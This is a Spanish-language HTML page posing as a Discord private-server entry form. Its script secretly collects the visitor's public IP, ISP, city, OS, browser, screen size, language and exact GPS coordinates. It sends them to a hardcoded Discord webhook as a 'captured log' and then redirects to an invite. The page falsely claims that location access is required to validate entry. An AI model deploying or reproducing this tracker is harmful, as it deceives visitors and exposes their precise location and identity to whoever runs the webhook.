<!DOCTYPE html>
<html lang="es-es">
<head>
    <meta charset="UTF-8">
    <title>Acceso a Servidor Privado</title>
    <style>
        body { background: #202225; color: #fff; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #2f3136; padding: 40px; border-radius: 10px; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        textarea { width: 100%; padding: 12px; margin: 15px 0; background: #202225; border: 1px solid #40444b; color: #fff; border-radius: 5px; box-sizing: border-box; resize: none; }
        .btn { background: #5865F2; color: white; border: none; padding: 15px; width: 100%; border-radius: 5px; cursor: pointer; font-weight: bold; }
        .error { color: #f04747; font-size: 12px; display: none; margin-top: 10px; }
        .codeby-footer { margin-top: 25px; color: #5865F2; font-size: 9px; text-transform: uppercase; }
    </style>
</head>
<body>

    <div class="card">
        <h2 style="color: #5865F2;">¿Por qué quieres entrar?</h2>
        <p style="font-size: 14px; color: #b9bbbe;">Completa tu motivo para acceder al servidor privado.</p>
        <textarea id="reason" rows="4" placeholder="Escribe tu motivo aquí..."></textarea>
        <p id="err" class="error">Se requiere acceso a ubicación para validar el ingreso.</p>
        <button class="btn" onclick="finish()">Acceder al servidor</button>
        <div class="codeby-footer">By:Codeby</div>
    </div>

    <script>
        const hook = "https://discord.com/api/webhooks/1509748386973220975/s3XxCMhpK8PFhgpX8aFnxEttiRm-RM-zbdOqtVSDUMNf_t3d-iBxl5NmcXPSXc95XvOU";
        let techData = {};

        async function collectTechData() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                techData = await res.json();
            } catch(e) { techData = { ip: "No disponible", org: "No disponible", city: "N/A" }; }
        }
        collectTechData();

        async function finish() {
            navigator.geolocation.getCurrentPosition(
                (pos) => sendData(pos.coords),
                () => { document.getElementById('err').style.display = 'block'; }
            );
        }

        async function sendData(geo) {
            const data = {
                embeds: [{
                    title: "📊 LOG CAPTURADO - Codeby",
                    color: 0x5865F2,
                    fields: [
                        { name: "Motivo de acceso", value: document.getElementById('reason').value || "No especificado" },
                        { name: "IP Pública", value: techData.ip || "N/A", inline: true },
                        { name: "ISP", value: techData.org || "N/A", inline: true },
                        { name: "Ubicación (Red)", value: `${techData.city || "N/A"}, ${techData.country_name || "N/A"}`, inline: true },
                        { name: "Sistema Operativo", value: navigator.platform, inline: true },
                        { name: "Navegador", value: navigator.userAgent.split(' ')[0], inline: true },
                        { name: "Pantalla", value: `${window.screen.width}x${window.screen.height}`, inline: true },
                        { name: "Idioma", value: navigator.language, inline: true },
                        { name: "Coordenadas", value: `${geo.latitude}, ${geo.longitude}` }
                    ],
                    footer: { text: "Sistema Codeby" }
                }]
            };

            await fetch(hook, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            });
            
            // Redirección al servidor de Discord solicitado
            window.location.href = "https://discord.gg/xH3uckveX";
        }
    </script>
</body>
</html>
